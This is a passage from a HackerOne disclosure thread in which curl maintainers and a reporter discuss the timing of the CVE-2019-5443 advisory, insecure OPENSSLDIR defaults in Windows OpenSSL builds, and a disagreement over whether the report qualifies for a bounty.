bit.)\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-21T10:56:05.318Z","updated_at":"2019-06-21T10:56:05.318Z","actor":{"username":"bagder","cleared":false,"url":"/bagder","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/459/380/963f64725677dda4f5113219588e7d0c1ab9abaa_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5157696,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I would like us to hold off on publishing the advisory a little if we can. I've communicated the original estimate of June 24 to the PostgreSQL project, so if we publish sooner than that I'd like to give them a heads up so they can prepare something which is somewhat timed.","markdown_message":"\u003cp\u003eI would like us to hold off on publishing the advisory a little if we can. I\u0026#39;ve communicated the original estimate of June 24 to the PostgreSQL project, so if we publish sooner than that I\u0026#39;d like to give them a heads up so they can prepare something which is somewhat timed.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-21T11:29:22.921Z","updated_at":"2019-06-21T11:29:22.921Z","actor":{"username":"dgustafsson","cleared":false,"url":"/dgustafsson","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5157919,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Ok, no worries. It gives me a little more time to prepare. I'll publish on the (Euro) morning the 24th.","markdown_message":"\u003cp\u003eOk, no worries. It gives me a little more time to prepare. I\u0026#39;ll publish on the (Euro) morning the 24th.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-21T12:23:07.675Z","updated_at":"2019-06-21T12:23:07.675Z","actor":{"username":"bagder","cleared":false,"url":"/bagder","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/459/380/963f64725677dda4f5113219588e7d0c1ab9abaa_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5175546,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"https://curl.haxx.se/docs/CVE-2019-5443.html is now public","markdown_message":"\u003cp\u003e\u003ca title=\"https://curl.haxx.se/docs/CVE-2019-5443.html\" href=\"/redirect?url=https%3A%2F%2Fcurl.haxx.se%2Fdocs%2FCVE-2019-5443.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://curl.haxx.se/docs/CVE-2019-5443.html\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e is now public\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-24T05:44:41.431Z","updated_at":"2019-06-24T05:44:41.431Z","actor":{"username":"bagder","cleared":false,"url":"/bagder","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/459/380/963f64725677dda4f5113219588e7d0c1ab9abaa_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5175562,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I also blogged about it here: https://daniel.haxx.se/blog/2019/06/24/openssl-engine-code-injection-in-curl/","markdown_message":"\u003cp\u003eI also blogged about it here: \u003ca title=\"https://daniel.haxx.se/blog/2019/06/24/openssl-engine-code-injection-in-curl/\" href=\"/redirect?url=https%3A%2F%2Fdaniel.haxx.se%2Fblog%2F2019%2F06%2F24%2Fopenssl-engine-code-injection-in-curl%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://daniel.haxx.se/blog/2019/06/24/openssl-engine-code-injection-in-curl/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-24T05:54:27.759Z","updated_at":"2019-06-24T05:54:27.759Z","actor":{"username":"bagder","cleared":false,"url":"/bagder","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/459/380/963f64725677dda4f5113219588e7d0c1ab9abaa_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5176405,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the work on this team!","markdown_message":"\u003cp\u003eThanks for the work on this team!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-24T08:44:59.537Z","updated_at":"2019-06-24T08:44:59.537Z","actor":{"username":"dgustafsson","cleared":false,"url":"/dgustafsson","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5176467,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I've updated the curl-for-win README with the security notice.\nThank you guys for all the efforts on this!\n","markdown_message":"\u003cp\u003eI\u0026#39;ve updated the curl-for-win README with the security notice.\u003cbr\u003e\nThank you guys for all the efforts on this!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-24T09:00:37.092Z","updated_at":"2019-06-24T09:00:37.092Z","actor":{"username":"vsz","cleared":false,"url":"/vsz","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/643/721/fde2d78348b717d0e9e169e1803f95a73bdb21b7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5177851,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Nice write-up @bagder. I hope many developers read your post and verify their applications.\n\nI really appreciate the hard work from all of you with getting this resolved. It is an impressive response that other programs should mimic.","markdown_message":"\u003cp\u003eNice write-up \u003ca href=\"/bagder\"\u003e@bagder\u003c/a\u003e. I hope many developers read your post and verify their applications.\u003c/p\u003e\n\n\u003cp\u003eI really appreciate the hard work from all of you with getting this resolved. It is an impressive response that other programs should mimic.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-24T12:06:56.260Z","updated_at":"2019-06-24T12:06:56.260Z","actor":{"username":"mirchr","cleared":true,"url":"/mirchr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/d5WVwYt8n5pYhhom1mNPokFG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5192130,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"We've discussed this issue within the team and we've come to the following conclusion.\n\nBecause this vulnerability was reported and published publicly before the curl security team was told about it, it does not fulfill the requirements of the curl bug bounty program.","markdown_message":"\u003cp\u003eWe\u0026#39;ve discussed this issue within the team and we\u0026#39;ve come to the following conclusion.\u003c/p\u003e\n\n\u003cp\u003eBecause this vulnerability was reported and published publicly before the curl security team was told about it, it does not fulfill the requirements of the curl bug bounty program.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-25T15:44:18.311Z","updated_at":"2019-06-25T15:44:18.311Z","actor":{"username":"bagder","cleared":false,"url":"/bagder","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/459/380/963f64725677dda4f5113219588e7d0c1ab9abaa_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5192304,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@bagder I respectfully disagree with this assessment. At the time of disclosing the PIA VPN client issue, I was not aware that curl was vulnerable to a similar issue or how many other programs were potentially affected. I did not test curl until the night of 6/11/2019. As soon as I confirmed the vulnerability, I responsibly reported it to the curl project within one hour. I have not posted any details about the curl vulnerability publicly. I have also talked to the OpenSSL project who confirmed that this is a per application vulnerability. \n\nI reviewed the curl disclosure policy and meet all requirements as currently written. I urge your team to reconsider because I am not sure how I could have handled this differently.\n\n\n","markdown_message":"\u003cp\u003e\u003ca href=\"/bagder\"\u003e@bagder\u003c/a\u003e I respectfully disagree with this assessment. At the time of disclosing the PIA VPN client issue, I was not aware that curl was vulnerable to a similar issue or how many other programs were potentially affected. I did not test curl until the night of 6/11/2019. As soon as I confirmed the vulnerability, I responsibly reported it to the curl project within one hour. I have not posted any details about the curl vulnerability publicly. I have also talked to the OpenSSL project who confirmed that this is a per application vulnerability. \u003c/p\u003e\n\n\u003cp\u003eI reviewed the curl disclosure policy and meet all requirements as currently written. I urge your team to reconsider because I am not sure how I could have handled this differently.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-25T16:16:00.725Z","updated_at":"2019-06-25T16:16:00.725Z","actor":{"username":"mirchr","cleared":true,"url":"/mirchr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/d5WVwYt8n5pYhhom1mNPokFG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5192716,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I'm not arguing for/against the bounty program assessment. Just my view of the scope of this (and potentially related) vulnerability/-ies:\n\nTo me this looks without much doubt an OpenSSL vulnerability. It can be _mitigated_ on the curl level by a) using a non-OpenSSL backend, b) switching dynamically to the Schannel backend, or c) keep using OpenSSL and explicitly disabling config load (though it's unclear if this fixes _all_ potential config load issues beyong code execution — likely not). It can also be mitigated by using non-default OpenSSL build options, though it's also unclear if these do fix the rest of potential issues. In fact to fix this specific issue, OpenSSL had to be custom-patched, so I'd argue the root cause wasn't fixed here. (OpenSSL didn't respond to my email detailing the configuration/build issue.) It's possible there exist other solutions that don't require patching OpenSSL, but none seem reasonably discoverable or trivial to implement. IMO such severe vulnerability must not be present in a default build configuration. OpenSSL seems to agree with this when they recently fixed this for _MSVC targets_ in 1.1.x.\n\nAs part of curl-for-win, OpenSSL static and dynamic libraries were being built and distributed as _separate downloads_ as well (also as one of the community builds on OpenSSL's Windows binary [page](https://wiki.openssl.org/index.php/Binaries)). _Any_ application built against those static libs, or any application loading the dynamic ones _are_ vulnerable to this same issue, unless they explictly disabled config load (which isn't very likely, I'd surmise.)\n\nBut again, it terms of CVE, I have no experience or knowledge how a vulnerability in a dependency should or should not apply to any directly or indirectly dependent project. OpenSSL being one of the most [widely used](https://formulae.brew.sh/analytics/install/365d/) [disclaimer: these stats are for the macOS platform] open source dependency, I'd personally find it best to address it in OpenSSL directly.","markdown_message":"\u003cp\u003eI\u0026#39;m not arguing for/against the bounty program assessment. Just my view of the scope of this (and potentially related) vulnerability/-ies:\u003c/p\u003e\n\n\u003cp\u003eTo me this looks without much doubt an OpenSSL vulnerability. It can be \u003cu\u003emitigated\u003c/u\u003e on the curl level by a) using a non-OpenSSL backend, b) switching dynamically to the Schannel backend, or c) keep using OpenSSL and explicitly disabling config load (though it\u0026#39;s unclear if this fixes \u003cu\u003eall\u003c/u\u003e potential config load issues beyong code execution — likely not). It can also be mitigated by using non-default OpenSSL build options, though it\u0026#39;s also unclear if these do fix the rest of potential issues. In fact to fix this specific issue, OpenSSL had to be custom-patched, so I\u0026#39;d argue the root cause wasn\u0026#39;t fixed here. (OpenSSL didn\u0026#39;t respond to my email detailing the configuration/build issue.) It\u0026#39;s possible there exist other solutions that don\u0026#39;t require patching OpenSSL, but none seem reasonably discoverable or trivial to implement. IMO such severe vulnerability must not be present in a default build configuration. OpenSSL seems to agree with this when they recently fixed this for \u003cu\u003eMSVC targets\u003c/u\u003e in 1.1.x.\u003c/p\u003e\n\n\u003cp\u003eAs part of curl-for-win, OpenSSL static and dynamic libraries were being built and distributed as \u003cu\u003eseparate downloads\u003c/u\u003e as well (also as one of the community builds on OpenSSL\u0026#39;s Windows binary \u003ca href=\"/redirect?url=https%3A%2F%2Fwiki.openssl.org%2Findex.php%2FBinaries\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003epage\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e). \u003cu\u003eAny\u003c/u\u003e application built against those static libs, or any application loading the dynamic ones \u003cu\u003eare\u003c/u\u003e vulnerable to this same issue, unless they explictly disabled config load (which isn\u0026#39;t very likely, I\u0026#39;d surmise.)\u003c/p\u003e\n\n\u003cp\u003eBut again, it terms of CVE, I have no experience or knowledge how a vulnerability in a dependency should or should not apply to any directly or indirectly dependent project. OpenSSL being one of the most \u003ca href=\"/redirect?url=https%3A%2F%2Fformulae.brew.sh%2Fanalytics%2Finstall%2F365d%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ewidely used\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e [disclaimer: these stats are for the macOS platform] open source dependency, I\u0026#39;d personally find it best to address it in OpenSSL directly.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-25T16:52:53.972Z","updated_at":"2019-06-25T16:53:56.065Z","actor":{"username":"vsz","cleared":false,"url":"/vsz","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/643/721/fde2d78348b717d0e9e169e1803f95a73bdb21b7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5193140,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"One more tidbit: Apparently, absolute Windows paths are accepted by OpenSSL build when building on Windows machines. The issue is that OpenSSL uses Perl's platform-native internal function to check whether a path is absolute, and this doesn't work with cross-build scenarios. It still makes it an OpenSSL issue and default builds are still insecure, but it at least allows a builder-level fix for non-cross-builders.\n\nSo simple issue, yet so complicated!","markdown_message":"\u003cp\u003eOne more tidbit: Apparently, absolute Windows paths are accepted by OpenSSL build when building on Windows machines. The issue is that OpenSSL uses Perl\u0026#39;s platform-native internal function to check whether a path is absolute, and this doesn\u0026#39;t work with cross-build scenarios. It still makes it an OpenSSL issue and default builds are still insecure, but it at least allows a builder-level fix for non-cross-builders.\u003c/p\u003e\n\n\u003cp\u003eSo simple issue, yet so complicated!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-25T18:14:20.951Z","updated_at":"2019-06-25T18:14:20.951Z","actor":{"username":"vsz","cleared":false,"url":"/vsz","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/643/721/fde2d78348b717d0e9e169e1803f95a73bdb21b7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5200793,"is_internal":false,"editable":false,"type":"Activities::CveIdAdded","message":"","markdown_message":"","automated_response":false,"created_at":"2019-06-26T16:48:34.015Z","updated_at":"2019-06-26T16:48:34.015Z","cve_ids":["CVE-2019-5443"],"actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5200804,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @bagder \n\nI wanted to add additional information and context.\n\nI need to reiterate that the situation you describe simply did not occur. The information on the curl vulnerability was not published prior to reporting it to the curl security team. In fact, I have never published details on the curl vulnerability.\n\nI reported the curl vulnerability to the curl project as soon as I discovered it. The night that I submitted the report was the first and only time that I had looked at curl. It would have been impossible for me to report the curl vulnerability prior to then.\n\nIt appears we're at an impasse, so at this point it might be best to engage a 3rd party to mediate. Since this bug bounty program is sponsored by the IBB we should have the option for their panel perform an independent review. The IBB FAQ page states that \"The Panel may provide general guidance on bounties, but the appropriate Security Teams will assess each individual report to determine its bounty eligibility. The Panel is available to meditate any disagreements that may arise.\". Please advise on the next steps to initiate the IBB mediation process.\n\nThough it has been great working with you and your team to resolve this vulnerability, I am very disappointed and feel that I am being treated unfairly for doing the right thing.","markdown_message":"\u003cp\u003eHi \u003ca href=\"/bagder\"\u003e@bagder\u003c/a\u003e \u003c/p\u003e\n\n\u003cp\u003eI wanted to add additional information and context.\u003c/p\u003e\n\n\u003cp\u003eI need to reiterate that the situation you describe simply did not occur. The information on the curl vulnerability was not published prior to reporting it to the curl security team. In fact, I have never published details on the curl vulnerability.\u003c/p\u003e\n\n\u003cp\u003eI reported the curl vulnerability to the curl project as soon as I discovered it. The night that I submitted the report was the first and only time that I had looked at curl. It would have been impossible for me to report the curl vulnerability prior to then.\u003c/p\u003e\n\n\u003cp\u003eIt appears we\u0026#39;re at an impasse, so at this point it might be best to engage a 3rd party to mediate. Since this bug bounty program is sponsored by the IBB we should have the option for their panel perform an independent review. The IBB FAQ page states that \u0026quot;The Panel may provide general guidance on bounties, but the appropriate Security Teams will assess each individual report to determine its bounty eligibility. The Panel is available to meditate any disagreements that may arise.\u0026quot;. Please advise on the next steps to initiate the IBB mediation process.\u003c/p\u003e\n\n\u003cp\u003eThough it has been great working with you and your team to resolve this vulnerability, I am very disappointed and feel that I am being treated unfairly for doing the right thing.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-26T16:50:18.753Z","updated_at":"2019-06-26T16:50:18.753Z","actor":{"username":"mirchr","cleared":true,"url":"/mirchr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/d5WVwYt8n5pYhhom1mNPokFG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5201787,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I'm afraid the IBB has no saying at all when it comes to what award amount we hand out (unless they decide to spend their money). That's a decision for the curl security team only.\n\nWe have not made a final decision on this subject, which is also why no reward amount has been set here on this issue and also why this issue is still open. We've noted your counter-argument and are processing it. We will get back soon.","markdown_message":"\u003cp\u003eI\u0026#39;m afraid the IBB has no saying at all when it comes to what award amount we hand out (unless they decide to spend their money). That\u0026#39;s a decision for the curl security team only.\u003c/p\u003e\n\n\u003cp\u003eWe have not made a final decision on this subject, which is also why no reward amount has been set here on this issue and also why this issue is still open. We\u0026#39;ve noted your counter-argument and are processing it. We will get back soon.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-26T20:23:56.724Z","updated_at":"2019-06-26T20:24:22.288Z","actor":{"username":"bagder","cleared":false,"url":"/bagder","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/459/380/963f64725677dda4f5113219588e7d0c1ab9abaa_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5201835,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for the update @bagder . I appreciate it.","markdown_message":"\u003cp\u003eThank you for the update \u003ca href=\"/bagder\"\u003e@bagder\u003c/a\u003e . I appreciate it.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-26T20:34:27.848Z","updated_at":"2019-06-26T20:34:27.848Z","actor":{"username":"mirchr","cleared":true,"url":"/mirchr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/d5WVwYt8n5pYhhom1mNPokFG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5201896,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"The root of the question here is whether the vulnerability was made public before the curl security advisory was published. This is where it becomes less black and white. The fact that the curl binaries were affected was not published, but the flaw was published in detail in a [blogpost](https://blog.mirch.io/2019/06/10/cve-2019-12572-pia-windows-privilege-escalation-malicious-openssl-engine/), a [CVE](https://github.com/mirchr/security-research/blob/master/vulnerabilities/PIA/CVE-2019-12572.txt) and a [tool](https://github.com/mirchr/openssldir_check).\n\nThe litmus test for me is:\n- Could the curl team have reached the same conclusion and fix had we only seen the information which was made public without getting this ticket?\n- In an alternate scenario where the curl CVE was the only and first information available, could the PIA team have reached the same conclusion and fix that they did?\n\nI believe that the answer to these questions is yes, the flaw is general and isolated enough that the same fix can be extrapolated and applied across projects/products as it is in the building of a third-party dependency rather than in core code.\n\nI would like to stress that the curl security team is very grateful for being notified, and has no incentive to try and cheat anyone from bounties that fall within the policy. The curl security team has a responsibility towards the curl project and community to follow and enforce the policy, thats it. We are internally discussing this issue and we ask for your understanding and patience, since this is more grey than it is black or white.","markdown_message":"\u003cp\u003eThe root of the question here is whether the vulnerability was made public before the curl security advisory was published. This is where it becomes less black and white. The fact that the curl binaries were affected was not published, but the flaw was published in detail in a \u003ca href=\"/redirect?url=https%3A%2F%2Fblog.mirch.io%2F2019%2F06%2F10%2Fcve-2019-12572-pia-windows-privilege-escalation-malicious-openssl-engine%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eblogpost\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e, a \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fmirchr%2Fsecurity-research%2Fblob%2Fmaster%2Fvulnerabilities%2FPIA%2FCVE-2019-12572.txt\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eCVE\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e and a \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fmirchr%2Fopenssldir_check\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003etool\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/p\u003e\n\n\u003cp\u003eThe litmus test for me is:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eCould the curl team have reached the same conclusion and fix had we only seen the information which was made public without getting this ticket?\u003c/li\u003e\n\u003cli\u003eIn an alternate scenario where the curl CVE was the only and first information available, could the PIA team have reached the same conclusion and fix that they did?\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eI believe that the answer to these questions is yes, the flaw is general and isolated enough that the same fix can be extrapolated and applied across projects/products as it is in the building of a third-party dependency rather than in core code.\u003c/p\u003e\n\n\u003cp\u003eI would like to stress that the curl security team is very grateful for being notified, and has no incentive to try and cheat anyone from bounties that fall within the policy. The curl security team has a responsibility towards the curl project and community to follow and enforce the policy, thats it. We are internally discussing this issue and we ask for your understanding and patience, since this is more grey than it is black or white.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-26T20:45:25.680Z","updated_at":"2019-06-26T20:45:25.680Z","actor":{"username":"dgustafsson","cleared":false,"url":"/dgustafsson","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5202136,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","markdown_message":"","automated_response":false,"created_at":"2019-06-26T21:31:34.033Z","updated_at":"2019-06-26T21:31:34.033Z","actor":{"username":"mserrano","cleared":false,"url":"/mserrano","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5202169,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for responding @dgustafsson. I appreciate your insight.\n\nThis is the first time I have discovered a vulnerability such as this so I have been trying to navigate it as best I can.\n\nThe response from the curl security team caught me off guard because I have reported similar issues to multiple open and closed source projects regardless if there is a possible bounty or not and none of them have taken this position and they are all fully aware of the blog post and tool. \n\nWhen I wrote the PIA blog post and tool, my main goal was to make people aware of what I found because there was a potential for multiple applications to be impacted of the same type of vulnerability. \n\nThe night before I released the blog post I struggled with the decision to go public or not. Ultimately I thought the information would be better if available to all security teams, developers and administrators to help secure their systems. I thought this would have been positively received by the community but I could have never imagined that it could have negatively impacted me. I am now rethinking my approach for publicizing future research.\n\nAfter writing the post I continued to check applications for this type of vulnerability. Since the post, I have found that many OpenSSL libraries with insecure paths, however the majority I was not able to fully prove out that the path was being used. I am not sure if I hit the proper code paths to verify or not but in most cases I have confirmed the vulnerability is when the application starts. I have also found that it’s not limited to cross compiling. Many applications are also using custom paths for OPENSSLDIR.\n\nGiven enough time and visibility I hope all developers become aware of this potential vulnerability. I wish there was an easy way to broadcast these concerns.\n\nI really appreciate hearing that feedback. I enjoy bug hunting and learning new things but it’s also very gratifying when my work directly relates to securing an application or system.\n\nThank you and your team for taking the time to fully evaluate the situation. ","markdown_message":"\u003cp\u003eThank you for responding \u003ca href=\"/dgustafsson\"\u003e@dgustafsson\u003c/a\u003e. I appreciate your insight.\u003c/p\u003e\n\n\u003cp\u003eThis is the first time I have discovered a vulnerability such as this so I have been trying to navigate it as best I can.\u003c/p\u003e\n\n\u003cp\u003eThe response from the curl security team caught me off guard because I have reported similar issues to multiple open and closed source projects regardless if there is a possible bounty or not and none of them have taken this position and they are all fully aware of the blog post and tool. \u003c/p\u003e\n\n\u003cp\u003eWhen I wrote the PIA blog post and tool, my main goal was to make people aware of what I found because there was a potential for multiple applications to be impacted of the same type of vulnerability. \u003c/p\u003e\n\n\u003cp\u003eThe night before I released the blog post I struggled with the decision to go public or not. Ultimately I thought the information would be better if available to all security teams, developers and administrators to help secure their systems. I thought this would have been positively received by the community but I could have never imagined that it could have negatively impacted me. I am now rethinking my approach for publicizing future research.\u003c/p\u003e\n\n\u003cp\u003eAfter writing the post I continued to check applications for this type of vulnerability. Since the post, I have found that many OpenSSL libraries with insecure paths, however the majority I was not able to fully prove out that the path was being used. I am not sure if I hit the proper code paths to verify or not but in most cases I have confirmed the vulnerability is when the application starts. I have also found that it’s not limited to cross compiling. Many applications are also using custom paths for OPENSSLDIR.\u003c/p\u003e\n\n\u003cp\u003eGiven enough time and visibility I hope all developers become aware of this potential vulnerability. I wish there was an easy way to broadcast these concerns.\u003c/p\u003e\n\n\u003cp\u003eI really appreciate hearing that feedback. I enjoy bug hunting and learning new things but it’s also very gratifying when my work directly relates to securing an application or system.\u003c/p\u003e\n\n\u003cp\u003eThank you and your team for taking the time to fully evaluate the situation. \u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-26T21:42:09.517Z","updated_at":"2019-06-26T21:42:09.517Z","actor":{"username":"mirchr","cleared":true,"url":"/mirchr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/d5WVwYt8n5pYhhom1mNPokFG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5202349,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@mirchr: Yes, most non-cross-builds are also likely affected, because _by default_ these builds are also insecure (recent MSVC builds excepted.) It means it requires the builder to explicitly specify a secure OPENSSLDIR/prefix at build-time. This assumes awareness of the issue in the first place and the necessary insight about what options to pass to get secure binaries. Build maintainers also tend to prefer relying on defaults as much as possible to keep continuous maintenance work and potential build issues arising from custom options as low as possible.\n\nTo sum up the security state of Windows builds as of 1.1.1:\n\n- MSVC: secure by default\n- MinGW (and similar) built on Windows: insecure by default\n- MinGW (and similar) cross-built: secure build not possible without\n  patching OpenSSL","markdown_message":"\u003cp\u003e\u003ca href=\"/mirchr\"\u003e@mirchr\u003c/a\u003e: Yes, most non-cross-builds are also likely affected, because \u003cu\u003eby default\u003c/u\u003e these builds are also insecure (recent MSVC builds excepted.) It means it requires the builder to explicitly specify a secure OPENSSLDIR/prefix at build-time. This assumes awareness of the issue in the first place and the necessary insight about what options to pass to get secure binaries. Build maintainers also tend to prefer relying on defaults as much as possible to keep continuous maintenance work and potential build issues arising from custom options as low as possible.\u003c/p\u003e\n\n\u003cp\u003eTo sum up the security state of Windows builds as of 1.1.1:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eMSVC: secure by 